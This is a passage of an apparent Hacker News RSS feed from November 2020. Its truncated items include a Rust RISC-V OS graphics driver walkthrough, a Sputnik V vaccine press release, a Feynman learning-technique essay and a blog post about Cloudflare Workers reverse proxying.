<ol><li>Create a host resource using <code>CmdResourceCreate2d</code>.</li><li>Allocate a framebuffer from guest ram, and attach it as backing storage to the resource just created, using <code>CmdResourceAttachBacking</code>.</li><li>Use <code>CmdSetScanout</code> to link the framebuffer to a display scanout.</li></ol>



<h3>A Request Structure</h3>



<p>Recall that our request and response come packaged together. We will put them in separate descriptors, but whenever we get a response back from the device, it is going to be easier if we free just once to free both the request and response. So, in Rust, I created the Request structure to support doing this.</p>



<pre data-enlighter-language="rust" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">struct Request&lt;RqT, RpT&gt; {
	request: RqT,
	response: RpT,
}
impl&lt;RqT, RpT&gt; Request&lt;RqT, RpT&gt; {
	pub fn new(request: RqT) -&gt; *mut Self {
		let sz = size_of::&lt;RqT&gt;() + size_of::&lt;RpT&gt;();
		let ptr = kmalloc(sz) as *mut Self;
		unsafe {
			(*ptr).request = request;
		}
		ptr
	}
}</pre>



<h4>Step 1: Create host resource</h4>



<pre data-enlighter-language="rust" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">let rq = Request::new(ResourceCreate2d {
	hdr: CtrlHeader {
		ctrl_type: CtrlType::CmdResourceCreate2d,
		flags: 0,
		fence_id: 0,
		ctx_id: 0,
		padding: 0,
	},
	resource_id: 1,
	format: Formats::R8G8B8A8Unorm,
	width: dev.width,
	height: dev.height,
});
let desc_c2d = Descriptor {
	addr: unsafe { &amp;(*rq).request as *const ResourceCreate2d as u64 },
	len: size_of::&lt;ResourceCreate2d&gt;() as u32,
	flags: VIRTIO_DESC_F_NEXT,
	next: (dev.idx + 1) % VIRTIO_RING_SIZE as u16,
};
let desc_c2d_resp = Descriptor {
	addr: unsafe { &amp;(*rq).response as *const CtrlHeader as u64 },
	len: size_of::&lt;CtrlHeader&gt;() as u32,
	flags: VIRTIO_DESC_F_WRITE,
	next: 0,
};
unsafe {
	let head = dev.idx;
	(*dev.queue).desc[dev.idx as usize] = desc_c2d;
	dev.idx = (dev.idx + 1) % VIRTIO_RING_SIZE as u16;
	(*dev.queue).desc[dev.idx as usize] = desc_c2d_resp;
	dev.idx = (dev.idx + 1) % VIRTIO_RING_SIZE as u16;
	(*dev.queue).avail.ring[(*dev.queue).avail.idx as usize % VIRTIO_RING_SIZE] = head;
	(*dev.queue).avail.idx = (*dev.queue).avail.idx.wrapping_add(1);
}</pre>



<p>All we’re really telling the GPU here is our resolution and the format of the framebuffer. When we create this, the host gets to configure itself, such as allocating an identical buffer to make transfers from our OS.</p>



<h4>Step 2: Attach framebuffer backing.</h4>



<pre data-enlighter-language="rust" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">let rq = Request3::new(AttachBacking {
	hdr: CtrlHeader {
		ctrl_type: CtrlType::CmdResourceAttachBacking,
		flags: 0,
		fence_id: 0,
		ctx_id: 0,
		padding: 0,
	},
	resource_id: 1,
	nr_entries: 1,
},
MemEntry {
	addr: dev.framebuffer as u64,
	length: dev.width * dev.height * size_of::&lt;Pixel&gt;() as u32,
	…</pre></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.stephenmarz.com/2020/11/11/risc-v-os-using-rust-graphics/">https://blog.stephenmarz.com/2020/11/11/risc-v-os-using-rust-graphics/</a></em></p>]]>
            </description>
            <link>https://blog.stephenmarz.com/2020/11/11/risc-v-os-using-rust-graphics/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25058039</guid>
            <pubDate>Wed, 11 Nov 2020 13:11:53 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Visualization of connections between politicians and orgs awarded gov contracts]]>
            </title>
            <description>
<![CDATA[
Score 35 | Comments 6 (<a href="https://news.ycombinator.com/item?id=25057931">thread link</a>) | @roxanneonhacker
<br/>
November 11, 2020 | https://sophieehill.shinyapps.io/my-little-crony/ | <a href="https://web.archive.org/web/*/https://sophieehill.shinyapps.io/my-little-crony/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      <p>
          A visualization of the connections between
          <strong>Tory politicians</strong>
          and
          <strong>companies being awarded government contracts during the pandemic,</strong>
          based on reporting by
          <a href="https://www.opendemocracy.net/en/dark-money-investigations/">openDemocracy,</a>
          <a href="https://bylinetimes.com/">Byline Times,</a>
          and more.
        </p>
    </div></div>]]>
            </description>
            <link>https://sophieehill.shinyapps.io/my-little-crony/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25057931</guid>
            <pubDate>Wed, 11 Nov 2020 12:57:16 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Advanced System-on-Chip Design Lecture Notes]]>
            </title>
            <description>
<![CDATA[
Score 215 | Comments 16 (<a href="https://news.ycombinator.com/item?id=25057889">thread link</a>) | @allending
<br/>
November 11, 2020 | https://iis-people.ee.ethz.ch/~gmichi/asocd/lecturenotes/ | <a href="https://web.archive.org/web/*/https://iis-people.ee.ethz.ch/~gmichi/asocd/lecturenotes/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://iis-people.ee.ethz.ch/~gmichi/asocd/lecturenotes/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25057889</guid>
            <pubDate>Wed, 11 Nov 2020 12:51:54 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[92% efficacy of Sputnik V Covid-19 vaccine]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25057881">thread link</a>) | @pama
<br/>
November 11, 2020 | https://sputnikvaccine.com/newsroom/pressreleases/the-first-interim-data-analysis-of-the-sputnik-v-vaccine-against-covid-19-phase-iii-clinical-trials-/ | <a href="https://web.archive.org/web/*/https://sputnikvaccine.com/newsroom/pressreleases/the-first-interim-data-analysis-of-the-sputnik-v-vaccine-against-covid-19-phase-iii-clinical-trials-/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<ul>
<li><i>The Sputnik V vaccine efficacy amounted to 92% (calculation based on the 20 confirmed COVID-19 cases split between vaccinated individuals and those who received the placebo). Currently 40,000 volunteers are taking part in double-blind, randomized, placebo-controlled Phase III of Sputnik V clinical trials, out of which over 20,000 have been vaccinated with the first dose of the vaccine and more than 16,000 with both the first and second doses of the vaccine. </i></li>
<li><i>Efficacy was demonstrated on the basis of a first interim analysis obtained 21 days after the first injection. </i></li>
<li><i>There were no unexpected adverse events during the trials. Monitoring of the participants is ongoing. </i></li>
<li><i>The world’s first registration of COVID-19 vaccine, done in Russia on the 11th of August under the emergency use authorization mechanism, enables the Russian Federation to administer the vaccine outside of the clinical trials to volunteers such as medics and other high-risk groups. Trials conducted under the civil use of the vaccine in Russia (not being a part of clinical trials) based on the monitoring of additional 10,000 vaccinated confirmed vaccine efficacy at a rate of over 90%. </i></li>
<li><i>The interim research data will be published by the Gamaleya Center team in one of the leading international peer-reviewed medical journals. Following the completion of Phase III clinical trials of the Sputnik V vaccine, Gamaleya Center will provide access to the full clinical trial report. </i></li>
<li><i>Currently Sputnik V Phase III clinical trials are approved and are undergoing in Belarus, UAE, Venezuela and other countries, as well as Phase II-III – in India. </i></li>
<li><i>The Sputnik V vaccine is based on a well-studied human adenoviral vector platform that had proven safe and effective with no long-term side effects in more than 250 clinical trials globally conducted during the past two decades (while the history of use of human adenoviruses in vaccine development started in 1953). More than 100,000 people have received approved and registered drugs based on the human adenoviral vectors. </i></li>
<li><i>The uniqueness of the Russian vaccine is in using two different human adenoviral vectors that enable to provide strong and long-term immune response after the second injection.</i> </li>
</ul>
<p>
<b>Moscow, 11.11.2020</b> – The National Research Center for Epidemiology and Microbiology named after N.F. Gamaleya of the Ministry of Health of the Russian Federation (Gamaleya Center) and the Russian Direct Investment Fund (RDIF, Russia’s sovereign wealth fund), announce that the Sputnik V vaccine, the world's first registered vaccine against coronavirus (registered on the 11th of August under the emergency use authorization mechanism) created on the well-studied platform of human adenoviral vectors, demonstrated high efficacy. The confirmation is based on the first interim data from the largest double-blind, randomized, placebo-controlled Phase III clinical trials in Russia involving 40,000 volunteers.
</p>
<p>
The trials evaluated efficacy among over 16,000 volunteers who received the vaccine or placebo 21 days after the first injection. As a result of a statistical analysis of 20 confirmed cases of coronavirus, the case split between vaccinated individuals and those who received the placebo indicates that the Sputnik V vaccine had an efficacy rate of 92% after the second dose.
</p>
<p>
Separately, in September the vaccine was first administered to a group of volunteers from the “red zones” of Russian hospitals. The observation of additional 10,000 vaccinated volunteers representing medics and other high-risk groups under the civil use of the vaccine out of clinical trials also confirmed the vaccine’s efficacy rate of over 90 percent.
</p>
<p>
The data received will be published by Gamaleya&nbsp;Center researchers in one of the world’s leading peer-reviewed medical academic journals following an independent valuation of the data by leading epidemiology experts. Following the completion of Phase III clinical trials of the Sputnik V vaccine, Gamaleya Center will provide access to the full clinical trial report.
</p>
<p>
As of November 11, as part of the clinical trials in Russia’s 29 medical centers, more than 20,000 volunteers were vaccinated with first dose and over 16,000 volunteers with the first and the second dose of the vaccine.
</p>
<p>
In addition, as of November 11, no unexpected adverse events were identified as part of the research. Some of those vaccinated had short-term minor adverse events such as pain at the injection site, flu-like syndrome including fever, weakness, fatigue, and headache.
</p>
<p>
During the clinical trials, the safety of the vaccine is constantly being monitored; information is analysed by the Independent Monitoring Committee comprising of leading Russian scientists. Collection, quality control and data processing is conducted in line with ICH GCP standards and involving active participation of Moscow’s Health Department and Crocus Medical, the contract research organization (CRO).
</p>
<p>
Observation of study participants will continue for six months after which the final report will be presented. Currently Sputnik V Phase III clinical trials are approved and are undergoing in Belarus, the UAE, Venezuela and other countries, as well as Phase II-III in India. A separate detailed study of the vaccine’s safety and immunogenicity for elderly people is being conducted.
</p>
<p>
The research data will be provided by RDIF to the national regulators of countries interested in purchasing the Russian vaccine in order to streamline the registration process.
</p>
<p>
<b>Mikhail Murashko, Minister of Health of the Russian Federation: </b><br>
“The use of the vaccine and the results of clinical trials demonstrate that it is an efficient solution to stop the spread of coronavirus infection, а preventive healthcare tool, and this is the most successful path to defeat the pandemic.”
</p>
<p>
<b>Alexander Gintsburg, Gamaleya Center Director: </b><br>
“The publication of the interim results of the post-registration clinical trials that convincingly demonstrate Sputnik V vaccine’s efficacy gives way to mass vaccination in Russia against COVID-19 in the coming weeks. Thanks to the production scale up at new manufacturing sites, Sputnik V vaccine will soon be available for a wider population. This will break the current trend and lead to an eventual decrease in COVID-19 infection rates, first in Russia, then globally.”
</p>
<p>
<b>Denis Logunov, Gamaleya Center Deputy Director: </b><br>
“Positive interim results of Phase III give reasons to expect a successful outcome of Sputnik V clinical trials. We will continue to process and analyse all the data and look to the future with optimism, expecting that results of our work will help end the pandemic sooner.”
</p>
<p>
<b>Kirill Dmitriev, CEO, Russian Direct Investment Fund: </b><br>
“Sputnik V is the first registered vaccine against COVID-19 in the world, the vaccine is based on safe and effective platform of human adenoviral vectors. More and more countries are recognizing the human adenoviral vector platform and plan to include these vaccines, as the most studied and known, in their respective national vaccine portfolio. I would also like to stress the importance of international cooperation and close partnership among vaccine-developing states. Vaccines should be above politics. The world needs a diversified portfolio of high-quality vaccines with Sputnik V, based on the well-tested human adenoviral vector platform, being an important element of it.”
</p>
<p>
The safety of vaccines based on human adenoviruses was confirmed in more than 75 international publications and more than 250 clinical trials conducted during the past two decades (while the history of use of human adenoviruses in vaccine development started in 1953). Adenovirus vectors are genetically modified viruses of the regular flu that cannot reproduce in a human body. When Sputnik V vaccine is used, the coronavirus itself does not enter the body as the vaccine only contains genetic information about part of its outer protein coat, the so called "spikes" forming its crown. This completely eliminates the possibility of getting infected as a result of vaccination while also causing the body's stable immune response.
</p>
<p>
On September 4, The Lancet, one of world’s leading medical journals, published a research paper on the results of Phase I and Phase II clinical trials of the vaccine that showed no serious adverse events and an effective immune response of those vaccinated.
</p>
<p>
Requests for more than 1.2 billion doses of Sputnik V vaccine came from over 50 countries. The vaccine supplies for the global market will be produced by RDIF’s international partners in India, Brazil, China, South Korea and other countries. The existing RDIF contracts with international partners enable the production of 500 million doses of the Sputnik V vaccine outside Russia annually. RDIF is now considering additional requests from a number of countries and companies to further increase its foreign production capacities.
</p>
<p>
On August 11, the Sputnik V vaccine developed by the Gamaleya Center was registered by Russia’s Health Ministry and became the world’s first registered vaccine against COVID-19. Detailed information on the Sputnik V vaccine, its human adenoviral vectors technological platform, and other details are available at&nbsp;<a href="http://" target="_blank">sputnikvaccine.com</a><a target="_blank" href="http://"></a>
</p>
<p>
<b>Be the first to learn about Sputnik V on social networks:</b>
</p>
<p>
<a href="https://twitter.com/sputnikvaccine" target="_blank">Twitter</a>
</p>
<p>
<a href="https://www.facebook.com/sputnikvaccine" target="_blank">Facebook</a>
</p>
<p>
<a href="https://www.instagram.com/sputnik_vaccine/" target="_blank">Instagram</a>
</p>
<p>
<a href="https://www.youtube.com/channel/UCLvQuKL3Nn7NnT9Jyi_dlgQ" target="_blank">Youtube</a>
</p>
<p>
***
</p>
<p>
<b>Russian Direct Investment Fund (RDIF) </b>is Russia's sovereign wealth fund established in 2011 to make equity co-investments, primarily in Russia, alongside reputable international financial and strategic investors. RDIF acts as a catalyst for direct investment in the Russian economy. RDIF’s management company is based in Moscow. Currently, RDIF has experience of the successful joint implementation of more than 80 projects with foreign partners totaling more than RUB1.9 trillion and covering 95% of the regions of the Russian Federation. RDIF portfolio companies employ more than 800,000 people and generate revenues which …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://sputnikvaccine.com/newsroom/pressreleases/the-first-interim-data-analysis-of-the-sputnik-v-vaccine-against-covid-19-phase-iii-clinical-trials-/">https://sputnikvaccine.com/newsroom/pressreleases/the-first-interim-data-analysis-of-the-sputnik-v-vaccine-against-covid-19-phase-iii-clinical-trials-/</a></em></p>]]>
            </description>
            <link>https://sputnikvaccine.com/newsroom/pressreleases/the-first-interim-data-analysis-of-the-sputnik-v-vaccine-against-covid-19-phase-iii-clinical-trials-/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25057881</guid>
            <pubDate>Wed, 11 Nov 2020 12:51:17 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Richard Feynman and How to Learn Anything Well]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25057821">thread link</a>) | @stanrivers
<br/>
November 11, 2020 | https://www.butwhatfor.com/feynman-technique/ | <a href="https://web.archive.org/web/*/https://www.butwhatfor.com/feynman-technique/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>Disclosure: Links to Amazon are generally affiliated links. As an Amazon Associate, we earn from qualifying purchases, meaning a commission may be generated on purchased items.</p><div>
<div>
<div>
<div>
<p><strong><a href="https://www.butwhatfor.com/richard-feynman/">Richard P. Feynman </a></strong> (1918 – 1988) was an American theoretical physicist often referred to as “The Great Explainer” due to his ability to make complex topics understandable. While he won the Nobel Price in Physics in 1965 for his work developing quantum electrodynamics, today he is also famous for his forays into bongo drum playing, Tuvan throat singing, and safe cracking.</p>
<div>
<figure>
<p><a href="https://cdn.substack.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2Fa27b9e93-62e5-4bb9-9632-c333e7503580_600x315.jpeg" target="_blank" rel="noopener noreferrer"><br>
<img src="https://cdn.substack.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2Fa27b9e93-62e5-4bb9-9632-c333e7503580_600x315.jpeg" alt="" data-attrs="{&quot;src&quot;:&quot;https://bucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com/public/images/a27b9e93-62e5-4bb9-9632-c333e7503580_600x315.jpeg&quot;,&quot;height&quot;:315,&quot;width&quot;:600,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:53211,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/jpeg&quot;,&quot;href&quot;:null}"><br>
</a></p>
</figure>
</div>
<p data-pm-context="[]">It is 1941 and you have a problem. While you haven’t yet gotten around to defining quantum electrodynamics or even started your work helping design the atomic bomb, you are nearing the end of your second year of graduate school. This means you have an exam soon.</p>
<p>That’s OK though. You know what to do. After all, you have made it this far already. You just do what you always do – you pull out a notebook. And not just any notebook, but one especially well-prepared for the task at hand. Namely, a blank one.</p>
<p>A fitting title is needed for the first page. You think for a moment, smiling to yourself as you creatively run through all the options you could pick. But, alas, none of them seem right. You opt for the tried-and-true but never worn out choice. You write it down.</p>
<p>You are Richard P. Feynman, arguably the brightest young physics mind in the United States at the time, and you have just written “Notebook Of Things I Don’t Know About” on the title page.</p>
<p><em>Note: For more on Richard Feynman, check out <a href="https://amzn.to/36pgDxt">Genius: The Life and Science of Richard Feynman, </a>the definitive biography by James Gleick, or Feynman’s autobiographical writings in<a href="https://amzn.to/35krIk7"> “Surely You’re Joking, Mr. Feynman!”</a></em></p>
<h4>The Feynman Learning Technique</h4>
<p>Feynman realized early on that people can trick themselves into believing they understand something more deeply than they truly do. This self-delusion often comes from an earnest effort focused on learning the wrong thing – learning the name of something as opposed to that which it truly is.</p>
<blockquote><p>The next Monday we were playing in a field, and a kid said to me, “What’s that bird? Do you know the name of that bird?” I said, “I haven’t the slightest idea.” He said, “Well, it is a brown‑throated thrush.” He said, “Your father doesn’t teach you anything.”</p>

<p>But my father had already taught me about the names of birds. Once we walked, and he said, “That is a brown-throated thrush. In German it is called the Pfleegel flügel. In Chinese it is called Keewontong. In Japanese a Towhatowharra”, and so on.</p>

<p>And when you know all the names of that bird in every language, you know nothing, know absolutely nothing, about the bird… So I had learned already that names don’t constitute knowledge…</p>

<p>We have to learn that these are the kinds of disciplines in the field of science that you have to learn – to know when you know, and when you don’t know, and what it is you know, and what it is you don’t know.</p>

<p>You’ve got to be very careful not to confuse yourself.</p></blockquote>
<p>Understanding this, Feynman was very careful to not delude himself into a superficial understanding of important topics. He developed a more holistic, multidisciplinary approach to learning that served him well throughout his career. While never specifically stated by Feynman as a set technique with steps, Feynman loved sharing with others enough that we can piece together his teachings, along with stories of his life, to better understand how he naturally approached learning anything new.</p>
<p>The combination of ideas, which many different authors outline slightly differently but are holistically the same, is known as <em>The Feynman Learning Technique</em>.</p>
<p>So how does this technique actually work?</p>
<h4>Step 1: Whatever you are trying to learn, take a stab at learning it</h4>
<p>The way that Feynman learned and internalized new ideas was to first attack them head on the old fashioned way – by reading and thinking through them. The key emphasis in that sentence is on the word <em>thinking</em>. Famously, Feynman would read the abstract of a scientific paper, and before reading any further, attempt to solve the stated problem. Only then would he read through the rest of the paper. He was focused on mentally wrestling with an idea as opposed to letting someone else walk him to the final answer.</p>
<p>So the first step in the process is to pick something that you need (or better yet, desire) to learn and spend time with the new idea until you have internalized it to the best of your ability.</p>
<p>Now, you might aptly question, “What is this <em>hogwash</em>? Step 1 of this supposed wonderfully useful learning technique is to learn something? I’m out.”</p>
<p>Stop your <em>swining</em> and don’t worry – there is more to it than that. Which brings us to the second step.</p>
<h4>Step 2: Write everything down, in as simple a way as possible, as if you were preparing a lecture for an inquisitive child</h4>
<p>This is where the notebook comes in. Open it. Close everything else.</p>
<p>From memory, write down everything you can about what you are trying to learn as if you were preparing to teach it to someone else. Preferably, pretend you are planning to teach the topic to a child – the more you can simplify your language and the ideas, the more likely you are to find areas where you are hiding behind the name of something as opposed to true understanding.</p>
<blockquote><p>Test it this way: You say, “Without using the new word which you have just learned, try to rephrase what you have just learned in your own language. Without using the word ‘energy,’ tell me what you know now about the dog’s motion.” You cannot. So you learned nothing about science. That may be all right. You may not want to learn something about science right away.</p>

<p>You have to learn definitions. But for the very first lesson, is that not possibly destructive?</p></blockquote>
<p>At this point, you will probably notice that there are things that you are missing or don’t remember as well as you thought you did. Write those items down – make a list of all the things you don’t know.</p>
<p>Now open everything back up and search out the answers to those items. Get to a point where you feel like you have conveyed what is required for your theoretical student to deeply understand the topic.</p>

<h4>Step 3: Ask questions as if you were a child to identify gaps in your understanding</h4>
<p data-pm-context="[]">Now you need to channel your inner child. Feynman’s neverending child-like curiosity is often viewed as the core, natural foundation that differentiated Feynman from other equally intelligent individuals. As children are wont to do, <a href="https://www.butwhatfor.com/invert-always-invert-avoid-failure-to-succeed/">start questioning every line you have written down</a>.</p>
<p>If we take a concept – for example, the calculation of <a href="https://www.investopedia.com/terms/n/npv.asp">net present value</a>. Why do we discount cash received in the future? How do you choose a discount rate? Can the rate change between people? Should it change over time? Can you use a different discount rate in different periods? How many years of cash do you think about? How do you determine what those cash numbers will be in the future? What happens if cash is negative in the future? And so on.</p>
<p>If you are seeking Feynman-level understanding, it is not enough to merely know the math formula as that is akin to just knowing the name of something. You need to understand the information qualitatively and quantitatively supporting the formula – only then should you feel confident in your understanding.</p>
<p>As you write out these new questions, you’ll find you can answer some of these. Maybe even most of these. However, at some point, you will run out of answers for the incessant child – write all these things down as items you “don’t know about.” Then go find the answers to these new topics.</p>
<p>By doing this, you are strengthening the foundation upon which your primary new learnings are ingrained in your head.</p>
<blockquote><p>But the problem, you see, when you ask&nbsp;<em>why</em>&nbsp;something happens, how does a person answer why something happens? For example, Aunt Minnie is in the hospital. <em>Why?</em> Because she went out, slipped on the ice, and broke her hip. That satisfies people. It satisfies, but it wouldn’t satisfy someone who came from another planet and who knew nothing about why when you break your hip do you go to the hospital…</p>

<p>And you begin to get a very interesting understanding of the world and all its complications. If you try to follow anything up, you go deeper and deeper in various directions. For example, if you go, “<em>Why did she slip on the ice?”</em> Well, ice is slippery. Everybody knows that, no problem. But you ask&nbsp;<em>why is ice slippery?</em>&nbsp;That’s kinda curious. Ice is extremely slippery. It’s very interesting. <em>You say, how does it work?</em> You could either say, “I’m satisfied that you’ve answered me. Ice is slippery; that explains it,” or you could go on and say, “<em>Why is ice slippery?”</em> and then you’re involved with something, because there aren’t many things as slippery as ice…</p>

<p><em>A solid that’s so slippery?</em> Because it is, in the case of ice, when you stand on it (they say) momentarily the pressure melts the ice a little bit so you get a sort of instantaneous water surface on which you’re slipping. W<em>hy on ice and not on other things?</em> Because water expands when it freezes, so the pressure tries to undo the expansion and melts it. It’s capable of melting, but other substances get cracked when they’re freezing, and when you push them they’re satisfied to be solid.</p>

<p><em>Why does water expand when it freezes and other substances don’t?</em> I’m not answering your question, but I’m telling you how difficult the&nbsp;<em>why&nbsp;</em>question is. You have to know what it is that you’re permitted to understand and allow to be understood and known, and what it is you’re not. You’ll notice, in this example, that the more I ask why, the deeper a thing is, the more interesting it gets. We could even go further and say, “<em>Why did she fall down when she slipped?”</em> It has to do with gravity, involves all the planets and everything else. Nevermind! It goes on and on.</p></blockquote>

<h4>Step 4: Repeat step 3 until the questioning adds no incremental value</h4>
<p data-pm-context="[]">Now you iterate with yourself. After you have written down the …</p></div></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.butwhatfor.com/feynman-technique/">https://www.butwhatfor.com/feynman-technique/</a></em></p>]]>
            </description>
            <link>https://www.butwhatfor.com/feynman-technique/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25057821</guid>
            <pubDate>Wed, 11 Nov 2020 12:39:56 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Hardly Working with Cloudflare Workers]]>
            </title>
            <description>
<![CDATA[
Score 14 | Comments 3 (<a href="https://news.ycombinator.com/item?id=25057709">thread link</a>) | @malthejorgensen
<br/>
November 11, 2020 | https://blog.notifly.io/2020/11/04/hardly-working-with-cloudflare-workers | <a href="https://web.archive.org/web/*/https://blog.notifly.io/2020/11/04/hardly-working-with-cloudflare-workers">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <!-- Possible titles:
Cloudflare workers are hard to work with
Working with Cloudflare Workers
Hardly working with Cloudflare Workers
-->

<p><em>Note: The team behind Notifly also runs <a href="https://www.eduflow.com/">Eduflow</a> and <a href="https://www.peergrade.io/">Peergrade</a>.</em></p>

<h2 id="introduction">Introduction</h2>

<p>This is the story of me trying to replace a simple NGINX reverse proxy (plus some basic redirects) with a Cloudflare Worker.</p>

<p>Our old landing page is a Wordpress blog hosted on WPEngine. Historically, this has always been set up behind an NGINX reverse proxy serving at <a href="http://peergrade.io/">peergrade.io</a> and <a href="http://www.peergrade.io/">www.peergrade.io</a>. The reverse proxy was needed for doing various redirects outside of Wordpress and doing some cookie trickery to redirect to <a href="http://app.peergrade.io/">app.peergrade.io</a> if the session cookie for the app was present.</p>

<p>The reverse proxy is hosted on DigitalOcean and is the only thing we have hosted there, so I wanted to get rid of it. We already use Cloudflare and so I thought “this would be a good test to try out Cloudflare Workers”. And less infrastructure is better, right?</p>

<h2 id="the-good-parts">The good parts</h2>

<p>Getting set up with <code>wrangler</code> – the CLI for Cloudflare Workers – was a breeze. It gives you a webpack setup out of the box which allowed me to install NPM packages and use them without any extra work on my part. I eventually downgraded to a setup without webpack (called “javascript” in <code>wrangler</code>) – since I ended up not needing any packages.</p>

<p>The vanilla Javascript setup allows you to “live edit” the worker at <code>https://dash.cloudflare.com/&lt;account-id&gt;/workers/edit/&lt;worker-slug&gt;</code></p>

<p>Here you can edit and run the updated script without saving and deploying the worker, allowing for a very fast and easy “edit-compile-run” loop.</p>

<p>Another cool thing is that you can change the URL in the small “browser” on the page to your liking – this is very useful for testing out proxies and other things that depend on the domain name or precise URL being sent to the worker. The debugger part of the UI is also incredibly useful but does have a tendency to disconnect from time to time.</p>

<h2 id="page-rules-vs-workers">Page Rules vs. Workers</h2>

<p>In a classic setup you’ll usually have a couple of redirects alongside your reverse proxy – and so do we. We use <a href="http://www.peergrade.io/">www.peergrade.io</a> as our canonical domain so we redirect peergrade.io to www.peergrade.io and we redirect http:// to https://.</p>

<p>This can be set up easily in Cloudflare by adding a couple of redirects in your Page Rules.</p>

<p>However, redirects from page rules are applied after any worker on the same URL. Since my worker’s default action is to reverse proxy, the redirect page rule will never be hit.</p>

<p>Annoyingly, this isn’t clearly described in the docs and you’ll have to find <a href="https://community.cloudflare.com/t/cf-workers-and-rate-limiting-firewall-rules-bot-management/132164/3">this forum post</a> from the official Cloudflare forum to know that.
The post notes that “<em>security-related ones will run before [workers]</em>” – but which ones are those? (All respect to Kenton Varda who wrote the post and is the main architect behind Cloudflare Workers. Cloudflare Workers <em>are</em> very very cool, but they are also a bit more quirky than I’d like at the moment)</p>

<p>In order to preserve these redirects, I’ll have to manually write them in the worker code (or relay the URLs that need to redirect to Cloudflare itself – which is basically the same amount of code).</p>

<!-- 
- An aside:

    Apparently *Always Use HTTPS* is such a "security-related" page rule, even though it's basically an http:// to https:// redirect. Cloudflare even admits to that [in the docs](https://support.cloudflare.com/hc/en-us/articles/204144518-SSL-FAQ#h_a61bfdef-08dd-40f8-8888-7edd8e40d156). 

    Cloudflare Page Rules allows you to set up multiple rules for a single URL-pattern, but then only allows you to use that pattern once. However, *Always Use HTTPS* is special and doesn't allow any other rules once it's used on a URL-pattern. This means if you want *Automatic HTTPS Rewrites* on top of *Always Use HTTPS* you have to specify 2 rules:

    1. www.peergrade.io – *Always Use HTTPS*
    2. [https://www.peergrade.io](https://www.peergrade.io) – *Automatic HTTPS Rewrites*
-->

<p>The same thing goes for cache rules. I had previously been using a page rule to aggressively cache static assets and user-uploaded content served from Wordpress. That now has to be written inside the worker as well.</p>

<p>Page rules have an internal ordering that you can set. Rules that match the given URL are executed in order – so that if two redirect rules match the URL, the first one in the ordering will be used. It would be <em>really nice</em> if workers could be added to the same list – that would mean I could put the redirects and cache rules before my worker and much more easily handle this scenario. <em>In principle</em> this would be easy if all the built-in page rules were reimplemented as workers, but there’s probably legacy behaviors and tie-ins to the rest of the stack that makes that impossible or at least non-trivial. (Still hoping for a future update on this 🤞🏻)</p>

<h2 id="the-reverse-proxy">The reverse proxy</h2>

<p>Back to the main task at hand – we’re implementing a simple reverse proxy and that happens to be <a href="https://developers.cloudflare.com/workers/examples/bulk-origin-proxy">one of the examples</a> in the Cloudflare Worker docs. However, getting it set up myself I quickly ran into issues with redirect loops and cases where my origin would redirect for seemingly no reason. To be fair, proxying can be tricky to get right since it’s hard to test properly before rollout, and on top of that you have DNS propagation and caching, which means there might be timing issues. But even with that, it seemed extra tricky with Cloudflare Workers.</p>

<p>On closer inspection, the example from the Cloudflare docs seems to defy reasoning. The incoming request in the example must have the header <code>Host: google.yourdomain.com</code> in order for it to match the Google entry in <code>ORIGINS</code>. I was able to confirm as much by inspecting the incoming request in the Cloudflare worker debugger. That incoming request is then relayed directly to <code>www.google.com</code>. Let’s try that ourselves:</p>

<div><div><pre><code>curl -H 'Host: google.yourdomain.com' https://www.google.com
</code></pre></div></div>

<p>The response we get is a 404 page (which makes sense since the host doesn’t match). However, the Cloudflare worker doesn’t get a 404 – it renders the familiar Google search frontpage. Something must be happening behind the scenes. That something is what I call “The Web Platform” part of Cloudflare Workers.</p>

<h2 id="the-web-platform">The Web Platform</h2>

<p>Cloudflare Workers uses Chrome’s V8 as its execution engine and this also sets the context in which your script is run.</p>

